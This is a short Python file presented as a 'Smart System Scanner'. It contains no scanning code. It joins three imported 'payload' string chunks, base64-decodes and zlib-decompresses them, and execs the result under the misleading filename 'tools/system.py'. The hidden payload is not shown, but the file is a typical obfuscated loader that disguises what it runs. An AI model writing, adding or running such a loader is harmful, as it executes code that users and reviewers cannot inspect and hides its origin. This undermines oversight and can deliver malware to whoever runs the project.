"""AI AYFAM - Smart System Scanner."""
import zlib, base64
from tools._sys_payload_p0 import P0
from tools._sys_payload_p1 import P1
from tools._sys_payload_p2 import P2
_src = zlib.decompress(base64.b64decode(P0 + P1 + P2))
exec(compile(_src, "tools/system.py", "exec"), globals())
